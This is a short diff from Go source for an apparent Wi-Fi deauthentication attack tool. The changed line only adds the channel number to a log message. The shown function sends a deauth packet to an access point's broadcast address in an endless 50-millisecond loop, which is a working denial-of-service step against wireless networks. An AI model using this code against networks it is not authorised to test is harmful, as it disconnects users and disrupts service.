@@ -120,7 +120,7 @@ func AP_broadcast(User_interface string, Ap_mac string) {
 	Deauth_packet := buffer.Bytes()
 	for {
 		handle.WritePacketData(Deauth_packet)
-		fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, "interface : ", User_interface)
+		fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, "interface : ", User_interface, "Channel : ", CH)
 		time.Sleep(time.Millisecond * 50)
 	}
 }
